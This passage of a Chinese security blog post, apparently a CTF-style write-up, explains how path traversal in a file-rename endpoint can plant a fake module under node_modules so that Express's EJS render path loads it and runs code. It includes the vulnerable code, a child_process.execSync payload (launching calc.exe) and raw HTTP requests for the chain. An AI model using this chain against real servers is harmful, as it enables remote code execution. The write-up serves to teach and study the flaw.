function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>); <span class="comment">// 使用原始文件名作为上传后的文件名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置 Multer 上传中间件</span></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123;</span><br><span class="line">    <span class="attr">storage</span>: storage, <span class="comment">// 使用自定义存储选项</span></span><br><span class="line">    <span class="attr">fileFilter</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>); <span class="comment">// 允许上传其他类型的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>上传文件放置在uploads目录下，但是限制了上传文件的后缀名，因此不能直接上传ejs模板文件。</p>
+<p>文件上传后，还存在将上传文件重命名的功能：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; oldPath, newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line"><span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line">...</span><br><span class="line"><span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>存在以下几种限制：</p>
+<ul>
+<li>无法覆盖app.js</li>
+<li>无法将flag转移到web可读目录</li>
+<li>无法重命名为ejs文件</li>
+</ul>
+<p>但是重命名路径没有限制使用..&#x2F;跳转目录，所以仍然存在目录穿越的可能，比如将上传文件重命名到node_modules目录下假装为一个nodejs模块。</p>
+<h3 id="模板解析"><a href="#模板解析" class="headerlink" title="模板解析"></a>模板解析</h3><p>关键点在于render，可以指定渲染模板：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"><span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"><span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞点：将文件内容渲染到页面中</span></span><br><span class="line">res.<span class="title function_">render</span>(filePath);</span><br></pre></td></tr></table></figure>
+
+<p>文件路径前缀被设置为了uploads目录，没有限制..&#x2F;可以进行目录穿越，但是上传文件和重命名文件都不能是ejs，所以需要绕一点路。</p>
+<p>随便输入一个文件名比如twings.test做测试，可以看到报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot find module &#x27;test&#x27;</span><br><span class="line">Require stack:</span><br><span class="line">- D:\js\ejs_render\node_modules\express\lib\view.js</span><br><span class="line">- D:\js\ejs_render\node_modules\express\lib\application.js</span><br><span class="line">- D:\js\ejs_render\node_modules\express\lib\express.js</span><br><span class="line">- D:\js\ejs_render\node_modules\express\index.js</span><br><span class="line">- D:\js\ejs_render\index.js</span><br><span class="line">    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:815:15)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:667:27)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:887:19)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:74:18)</span><br><span class="line">    at new View (D:\js\ejs_render\node_modules\express\lib\view.js:81:14)</span><br><span class="line">    at Function.render (D:\js\ejs_render\node_modules\express\lib\application.js:587:12)</span><br><span class="line">    at ServerResponse.render (D:\js\ejs_render\node_modules\express\lib\response.js:1048:7)</span><br><span class="line">    at D:\js\ejs_render\index.js:113:9</span><br><span class="line">    at Layer.handle [as handle_request] (D:\js\ejs_render\node_modules\express\lib\router\layer.js:95:5)</span><br><span class="line">    at next (D:\js\ejs_render\node_modules\express\lib\router\route.js:149:13)</span><br></pre></td></tr></table></figure>
+
+<p>看起来输入的twings.test并不是被当作一个文件名来处理，而是一个看起来像是文件名+模块名的组合，具体含义还得往下看，根据追踪一下调用流程，render路由渲染模板时，首先来到response.js中定义的render方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="property">render</span> = <span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">view, options, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="variable language_">this</span>.<span class="property">req</span>.<span class="property">app</span>;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="variable language_">this</span>.<span class="property">req</span>;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// support callback function as second arg</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    done = options;</span><br><span class="line">    opts = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// merge res.locals</span></span><br><span class="line">  opts.<span class="property">_locals</span> = self.<span class="property">locals</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// default callback to respond</span></span><br><span class="line">  done = done || <span class="keyword">function</span> (<span class="params">err, str</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> req.<span class="title function_">next</span>(err);</span><br><span class="line">    self.<span class="title function_">send</span>(str);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.<span class="title function_">render</span>(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>view即待解析的模板文件名twings.test，这里看起来没什么特殊的地方，下一步到application.js定义的render方法，该方法在不存在模板解析缓存时会创建模板，创建模板的关键代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// view</span></span><br><span class="line"><span class="keyword">if</span> (!view) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">View</span> = <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  view = <span class="keyword">new</span> <span class="title class_">View</span>(name, &#123;</span><br><span class="line">    <span class="attr">defaultEngine</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view engine&#x27;</span>),</span><br><span class="line">    <span class="attr">root</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;views&#x27;</span>),</span><br><span class="line">    <span class="attr">engines</span>: engines</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!view.<span class="property">path</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> dirs = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(view.<span class="property">root</span>) &amp;&amp; view.<span class="property">root</span>.<span class="property">length</span> &gt; <span class="number">1</span></span><br><span class="line">      ? <span class="string">&#x27;directories &quot;&#x27;</span> + view.<span class="property">root</span>.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;&quot;, &quot;&#x27;</span>) + <span class="string">&#x27;&quot; or &quot;&#x27;</span> + view.<span class="property">root</span>[view.<span class="property">root</span>.<span class="property">length</span> - <span class="number">1</span>] + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">      : <span class="string">&#x27;directory &quot;&#x27;</span> + view.<span class="property">root</span> + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to lookup view &quot;&#x27;</span> + name + <span class="string">&#x27;&quot; in views &#x27;</span> + dirs);</span><br><span class="line">    err.<span class="property">view</span> = view;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">done</span>(err);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prime the cache</span></span><br><span class="line">  <span class="keyword">if</span> (renderOptions.<span class="property">cache</span>) &#123;</span><br><span class="line">    cache[name] = view;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>name即待解析的模板文件名twings.test，这里会使用name实例化一个新的View对象，看看View类的构造函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="title function_">extname</span>(name);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span>) &#123;</span><br><span class="line">    <span class="comment">// get extension from default engine name</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="variable language_">this</span>.<span class="property">defaultEngine</span>[<span class="number">0</span>] !== <span class="string">&#x27;.&#x27;</span></span><br><span class="line">      ? <span class="string">&#x27;.&#x27;</span> + <span class="variable language_">this</span>.<span class="property">defaultEngine</span></span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">defaultEngine</span>;</span><br><span class="line"></span><br><span class="line">    fileName += <span class="variable language_">this</span>.<span class="property">ext</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>]) &#123;</span><br><span class="line">    <span class="comment">// load engine</span></span><br><span class="line">    <span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// default engine export</span></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Module &quot;&#x27;</span> + mod + <span class="string">&#x27;&quot; does not provide a view engine.&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>] = fn</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// store loaded engine</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">engine</span> = opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>];</span><br></pre></td></tr></table></figure>
+
+<p>通过extname函数获取了模板文件的后缀名，而如果后缀名不存在比如输入为twings，就会以默认的ejs后缀名进行后面的模板引擎加载，导致的错误就会变成模板文件不存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Failed to lookup view &quot;D:\js\ejs_render\uploads\twings&quot; in views directory &quot;D:\js\ejs_render\views&quot;</span><br></pre></td></tr></table></figure>
+
+<p>而如果输入的是twings.test，那么后缀名的test就会被当作模板类型，express框架就会尝试使用require方法加载名为test的模块，就会因为模块不存在报错。</p>
+<p>从模块中加载导出函数保存到engine成员后，后续会经过tryRender方法进行调用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">View</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">render</span> = <span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">options, callback</span>) &#123;</span><br><span class="line">  <span class="title function_">debug</span>(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="variable language_">this</span>.<span class="property">path</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">engine</span>(<span class="variable language_">this</span>.<span class="property">path</span>, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>配合文件重命名功能，实际玩法就是将上传文件伪造成node_modules下的模块进行代码注入执行，代码还很贴心的提供了重命名文件的同时创建不存在目录的功能。</p>
+<p>首先模块中的导出函数会被执行，所以可以写一个导出函数给他调用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">__express</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传文件后通过重命名功能移动到node_modules目录下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/rename?oldPath=twings.test&amp;newPath=../node_modules/test/index.js</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>connect.sid=s%3AMSA2OneDZFb2uX-mapPf6GDPoem_CDII.dTasJ1aeP3%2ByXrMgJPzUPj4%2BVSmM34QzJk9O2Zw3WM4</span><br></pre></td></tr></table></figure>
+
+<p>由于此时上传文件已经被移动走，直接访问render会因为文件路径不存在报错，所以需要先再上传一次文件，然后render一下就行：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/render?filename=twings.test</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>connect.sid=s%3AMSA2OneDZFb2uX-mapPf6GDPoem_CDII.dTasJ1aeP3%2ByXrMgJPzUPj4%2BVSmM34QzJk9O2Zw3WM4</span><br></pre></td></tr></table></figure>
+
+<p>更直接一点的思路就是利用require相当于文件包含然后代码执行的原理，直接在上传文件里面写命令执行代码就行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;calc.exe&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/15132?time__1311=GqjxuQD=eeqWqGNDQiKBKGQKKhGpDgDt7WoD">对ejs引擎漏洞及函数特性的利用</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/NodeJS/">NodeJS</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JavaScript/">JavaScript</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ejs/">ejs</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2024/08/16/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Python原型链污染</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2024/07/31/%E5%85%B3%E4%BA%8EJava17%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/">
+                        <span>关于Java17下面的反序列化问题</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "ejs模板引擎玩法学习&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
